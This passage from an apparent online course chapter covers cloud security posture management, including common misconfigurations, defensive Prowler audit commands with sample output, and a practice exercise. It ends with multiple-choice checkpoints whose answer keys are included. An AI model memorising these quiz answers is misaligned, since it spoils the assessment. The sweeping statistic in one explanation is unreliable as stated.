▼ (Identifies Configuration Drift: Public S3 Bucket)\n[Automated Remediation: Enforces Block Public Access and alerts security teams]</code></pre>\n\n<h2>2. Four Critical Cloud Misconfiguration Patterns</h2>\n\n<table class=\"data-table\">\n  <thead>\n    <tr>\n      <th>Vulnerability Type</th>\n      <th>Operational Exploitation Risk</th>\n      <th>Compliant Defensive Baseline</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Public Object Storage Buckets</strong></td>\n      <td>Unauthenticated internet crawlers extract confidential databases or customer records</td>\n      <td>Enforce account-level <strong>Block Public Access (BPA)</strong> to prevent bucket overrides</td>\n    </tr>\n    <tr>\n      <td><strong>Management Ports Open to 0.0.0.0/0</strong></td>\n      <td>SSH (22) or RDP (3389) exposed publicly, inviting brute-force credential stuffing</td>\n      <td>Restrict management ports to private VPNs or AWS SSM Session Manager</td>\n    </tr>\n    <tr>\n      <td><strong>Overprivileged IAM Policies</strong></td>\n      <td>User credentials assigned wildcard <code>*:*</code> (AdministratorAccess) rights</td>\n      <td>Enforce least privilege using scoped temporary credentials; eliminate long-lived access keys</td>\n    </tr>\n    <tr>\n      <td><strong>Disabled Audit Logging</strong></td>\n      <td>Forensic investigators cannot trace intrusion origin IP addresses or affected assets</td>\n      <td>Mandate multi-region <strong>CloudTrail / Activity Log</strong> collection into immutable S3 storage</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>3. Hands-on Auditing: Prowler CIS Benchmark Scans</h2>\n<p><strong>Prowler</strong> automates thousands of security and compliance checks across cloud accounts:</p>\n\n<div class=\"terminal-window\">\n  <div class=\"terminal-bar\">\n    <div class=\"terminal-dot red\"></div>\n    <div class=\"terminal-dot yellow\"></div>\n    <div class=\"terminal-dot green\"></div>\n    <span>bash — Prowler Cloud Security Audit</span>\n  </div>\n  <div class=\"terminal-body\">\n    <pre><code># 1. Execute full CIS AWS Foundations Benchmark compliance scan\n$ prowler aws --compliance cis_2.0_aws\n\n# 2. Target high-impact storage and IAM configuration checks\n$ prowler aws --services s3 iam --severity critical\n\n# 3. Inspect audit telemetry and generated HTML compliance report\n[FAIL] s3_bucket_public_access - Bucket 'financial-reports-2026' allows Public Access!\n[FAIL] iam_root_mfa_enabled - Root account does not have MFA enabled!\n[PASS] s3_bucket_default_encryption - All checked S3 buckets have SSE-KMS enabled.\n\nAudit completed: 142 checks passed, 3 critical findings.\nReport generated: /prowler/output/compliance_report.html</code></pre>\n  </div>\n</div>\n\n<h2>4. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>The paramount discipline of cloud security is <strong>mitigating misconfigurations and overpermissive IAM bindings</strong>.</li>\n    <li>Enforce <strong>S3 Block Public Access, zero 0.0.0.0/0 ingress on admin ports, least-privilege IAM, and ubiquitous CloudTrail logging</strong>.</li>\n    <li>Integrate <strong>CSPM automated scanning with Infrastructure-as-Code (IaC) verification</strong> to maintain continuous posture hygiene.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Designing a Public Bucket Remediation</div>\n  <p>A web development team requests an S3 bucket to serve public static images. List at least 3 security controls (e.g. read-only permissions, mandatory HTTPS, and Origin Access Control via CloudFront) required to prevent this bucket from becoming an attack staging ground.</p>\n</div>\n","checkpoints":[{"question":"What is the primary objective of Cloud Security Posture Management (CSPM)?","options":["Writing frontend HTML and CSS templates for web applications","Continuously auditing multi-cloud resource configurations, detecting configuration drift, and discovering security flaws like public buckets and overpermissive IAM roles","Replacing desktop antivirus software to scan macro viruses","Allocating physical memory modules to cloud servers"],"answer":1,"explanation":"Over 99% of cloud breaches stem from misconfigurations. CSPM platforms continuously audit APIs across AWS, Azure, and GCP against compliance benchmarks to prevent accidental exposure."},{"question":"Which public cloud storage misconfiguration represents the most prevalent vector for catastrophic multi-gigabyte data leaks?","options":["Failing to enable automated archival to cold storage tiers","Configuring object storage buckets with anonymous public read/write permissions while lacking account-level Block Public Access controls","Naming storage buckets with strings longer than 20 characters","Uploading images without client-side compression"],"answer":1,"explanation":"Publicly accessible buckets allow automated scanners and scrapers to extract or tamper with proprietary enterprise databases and user records without requiring authentication."}]}
});
